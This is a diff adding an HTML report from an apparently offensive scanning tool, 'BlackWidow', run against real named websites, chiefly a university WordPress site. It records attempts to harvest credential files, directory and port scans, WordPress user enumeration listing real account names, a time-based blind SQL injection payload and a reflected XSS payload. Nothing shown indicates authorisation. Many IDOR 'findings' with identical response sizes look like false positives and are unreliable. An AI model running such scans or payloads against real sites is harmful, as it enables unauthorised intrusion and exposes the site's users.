@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>BlackWidow Report</title>
+<style>
+  body { font-family: 'Courier New', monospace; background: #0d0d0d; color: #e0e0e0; padding: 20px; }
+  h1 { color: #cc0000; border-bottom: 2px solid #cc0000; padding-bottom: 8px; }
+  h2 { color: #ff4444; margin-top: 30px; }
+  pre { background: #1a1a1a; border: 1px solid #333; padding: 15px; border-radius: 4px;
+         overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+  .vuln { border-left: 4px solid #cc0000; padding-left: 10px; margin: 10px 0; }
+  .found { border-left: 4px solid #00aa44; padding-left: 10px; margin: 10px 0; }
+  .meta { color: #888; font-size: 0.85em; }
+</style>
+</head>
+<body>
+<h1>🕷 BlackWidow Report</h1>
+<p class="meta">Generated: 20261113_094019</p>
+<h2>Auth Bypass Scan</h2>
+<h2>Brute Force</h2>
+<h2>Cred Harvest</h2>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/wp-config.php",
+  "status": 200,
+  "size": 0,
+  "credentials": []
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/.htpasswd",
+  "status": 403,
+  "size": 285,
+  "note": "Forbidden \u2014 file may exist but access is blocked",
+  "credentials": []
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/server-status",
+  "status": 403,
+  "size": 285,
+  "note": "Forbidden \u2014 file may exist but access is blocked",
+  "credentials": []
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/robots.txt",
+  "status": 200,
+  "size": 127,
+  "credentials": []
+}</pre></div>
+<h2>Defacement Check</h2>
+<pre>{
+  "url": "https://ingetinaja.web.id?id=1",
+  "defacement_keywords": [],
+  "changed": null,
+  "hash_mismatch": null
+}</pre>
+<h2>Detect</h2>
+<pre>{
+  "url": "https://balaibahasa.upi.edu",
+  "final_url": "https://balaibahasa.upi.edu/",
+  "status": 200,
+  "server": "Apache/2.4.58 (Ubuntu)",
+  "x_powered_by": "",
+  "frameworks": [
+    {
+      "name": "WordPress",
+      "evidence": [
+        "html:wp-content"
+      ],
+      "score": 1
+    },
+    {
+      "name": "Google Font API",
+      "evidence": [
+        "html:fonts.googleapis.com"
+      ],
+      "score": 1
+    },
+    {
+      "name": "React",
+      "evidence": [
+        "js:createElement"
+      ],
+      "score": 1
+    }
+  ],
+  "top": {
+    "name": "WordPress",
+    "evidence": [
+      "html:wp-content"
+    ],
+    "score": 1,
+    "wordlist": "wordlists/framework/wordpress.txt"
+  },
+  "api_base": null,
+  "live_api_endpoints": [],
+  "raw_headers": {
+    "Date": "Fri, 13 Nov 2026 02:24:44 GMT",
+    "Server": "Apache/2.4.58 (Ubuntu)",
+    "Link": "<https://cdn.gtranslate.net/>; rel=dns-prefetch",
+    "No-Vary-Search": "params=(\"PageSpeed\")",
+    "Vary": "Accept-Encoding",
+    "Content-Encoding": "gzip",
+    "Content-Length": "44522",
+    "Keep-Alive": "timeout=5, max=100",
+    "Connection": "Keep-Alive",
+    "Content-Type": "text/html; charset=UTF-8"
+  }
+}</pre>
+<h2>Dir Scan</h2>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/wp-includes",
+  "status": 301,
+  "size": 334,
+  "content_type": "text/html; charset=iso-8859-1"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/wp-content",
+  "status": 301,
+  "size": 333,
+  "content_type": "text/html; charset=iso-8859-1"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/management",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/server-status",
+  "status": 403,
+  "size": 285,
+  "content_type": "text/html; charset=iso-8859-1"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/wp-admin",
+  "status": 301,
+  "size": 331,
+  "content_type": "text/html; charset=iso-8859-1"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/admin",
+  "status": 302,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/admin/",
+  "status": 302,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/.cache",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/phpmyadmin",
+  "status": 301,
+  "size": 333,
+  "content_type": "text/html; charset=iso-8859-1"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/robots.txt",
+  "status": 200,
+  "size": 127,
+  "content_type": "text/plain"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/sitemap.xml",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/.htpasswd",
+  "status": 403,
+  "size": 285,
+  "content_type": "text/html; charset=iso-8859-1"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/license.txt",
+  "status": 200,
+  "size": 19903,
+  "content_type": "text/plain"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/readme.html",
+  "status": 200,
+  "size": 7407,
+  "content_type": "text/html"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/.htaccess",
+  "status": 403,
+  "size": 285,
+  "content_type": "text/html; charset=iso-8859-1"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/dashboard",
+  "status": 302,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/admin/index.php",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/login",
+  "status": 302,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/about",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/contact",
+  "status": 301,
+  "size": 0,
+  "content_type": "text/html; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/atom",
+  "status": 301,
+  "size": 0,
+  "content_type": "application/atom+xml; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/rss",
+  "status": 301,
+  "size": 0,
+  "content_type": "application/rss+xml; charset=UTF-8"
+}</pre></div>
+<div class="found"><pre>{
+  "url": "https://balaibahasa.upi.edu/favicon.ico",
+  "status": 200,
+  "size": 3695,
+  "content_type": "image/vnd.microsoft.icon"
+}</pre></div>
+<h2>Idor Scan</h2>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=2",
+  "param": "id",
+  "id_tested": 2,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=3",
+  "param": "id",
+  "id_tested": 3,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=4",
+  "param": "id",
+  "id_tested": 4,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=5",
+  "param": "id",
+  "id_tested": 5,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=6",
+  "param": "id",
+  "id_tested": 6,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=7",
+  "param": "id",
+  "id_tested": 7,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=8",
+  "param": "id",
+  "id_tested": 8,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=9",
+  "param": "id",
+  "id_tested": 9,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=10",
+  "param": "id",
+  "id_tested": 10,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=11",
+  "param": "id",
+  "id_tested": 11,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=12",
+  "param": "id",
+  "id_tested": 12,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=13",
+  "param": "id",
+  "id_tested": 13,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=14",
+  "param": "id",
+  "id_tested": 14,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=15",
+  "param": "id",
+  "id_tested": 15,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=16",
+  "param": "id",
+  "id_tested": 16,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=17",
+  "param": "id",
+  "id_tested": 17,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=18",
+  "param": "id",
+  "id_tested": 18,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=19",
+  "param": "id",
+  "id_tested": 19,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=20",
+  "param": "id",
+  "id_tested": 20,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=21",
+  "param": "id",
+  "id_tested": 21,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=22",
+  "param": "id",
+  "id_tested": 22,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=23",
+  "param": "id",
+  "id_tested": 23,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=24",
+  "param": "id",
+  "id_tested": 24,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=25",
+  "param": "id",
+  "id_tested": 25,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=26",
+  "param": "id",
+  "id_tested": 26,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=27",
+  "param": "id",
+  "id_tested": 27,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=28",
+  "param": "id",
+  "id_tested": 28,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=29",
+  "param": "id",
+  "id_tested": 29,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=30",
+  "param": "id",
+  "id_tested": 30,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=31",
+  "param": "id",
+  "id_tested": 31,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=32",
+  "param": "id",
+  "id_tested": 32,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=33",
+  "param": "id",
+  "id_tested": 33,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=34",
+  "param": "id",
+  "id_tested": 34,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=35",
+  "param": "id",
+  "id_tested": 35,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=36",
+  "param": "id",
+  "id_tested": 36,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=37",
+  "param": "id",
+  "id_tested": 37,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=38",
+  "param": "id",
+  "id_tested": 38,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=39",
+  "param": "id",
+  "id_tested": 39,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=40",
+  "param": "id",
+  "id_tested": 40,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=42",
+  "param": "id",
+  "id_tested": 42,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=43",
+  "param": "id",
+  "id_tested": 43,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=44",
+  "param": "id",
+  "id_tested": 44,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=45",
+  "param": "id",
+  "id_tested": 45,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=46",
+  "param": "id",
+  "id_tested": 46,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=47",
+  "param": "id",
+  "id_tested": 47,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=48",
+  "param": "id",
+  "id_tested": 48,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=49",
+  "param": "id",
+  "id_tested": 49,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "IDOR",
+  "url": "https://balaibahasa.upi.edu?id=50",
+  "param": "id",
+  "id_tested": 50,
+  "status": 200,
+  "response_length": 282940
+}</pre></div>
+<h2>Js Mine</h2>
+<pre>{
+  "target": "https://ingetinaja.web.id",
+  "bundles_analyzed": [
+    "https://ingetinaja.web.id/assets/index-DLqFH73D.js"
+  ],
+  "api_endpoints": [
+    "/items/${n}",
+    "/items/${n}/complete",
+    "/subscription/qris/status/${t}"
+  ],
+  "client_routes": [],
+  "secrets": [],
+  "env_vars": []
+}</pre>
+<h2>Port Scan</h2>
+<div class="found"><pre>{
+  "port": 22,
+  "status": "open",
+  "service": "ssh"
+}</pre></div>
+<div class="found"><pre>{
+  "port": 53,
+  "status": "open",
+  "service": "domain"
+}</pre></div>
+<h2>Session Scan</h2>
+<h2>Sqli Scan</h2>
+<div class="vuln"><pre>{
+  "type": "SQLi (Time-Based Blind)",
+  "url": "https://balaibahasa.upi.edu?id=%27%3B+WAITFOR+DELAY+%270%3A0%3A4%27--",
+  "param": "id",
+  "payload": "'; WAITFOR DELAY '0:0:4'--",
+  "evidence": "Response took 9.84s"
+}</pre></div>
+<h2>Ssrf Scan</h2>
+<h2>Subdomain Scan</h2>
+<h2>Wp Scan</h2>
+<div class="vuln"><pre>{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-admin",
+  "status": 200
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-content",
+  "status": 200
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-includes",
+  "status": 200
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/readme.html",
+  "status": 200
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/license.txt",
+  "status": 200
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-json/wp/v2/users",
+  "status": 200
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "WP Exposed Path",
+  "url": "https://balaibahasa.upi.edu/wp-json/",
+  "status": 200
+}</pre></div>
+<div class="vuln"><pre>{
+  "type": "WP User Enumeration",
+  "users": [
+    {
+      "id": 7,
+      "slug": "endang",
+      "name": "admin"
+    },
+    {
+      "id": 3,
+      "slug": "agus_bb",
+      "name": "agus_bb"
+    },
+    {
+      "id": 1,
+      "slug": "admin"
+    }
+  ]
+}</pre></div>
+<h2>Xss Scan</h2>
+<div class="vuln"><pre>{
+  "type": "XSS (Reflected)",
+  "url": "https://balaibahasa.upi.edu/",
+  "payload": "javascript:alert(1)",
+  "field": "s"
+}</pre></div>
+</body></html>
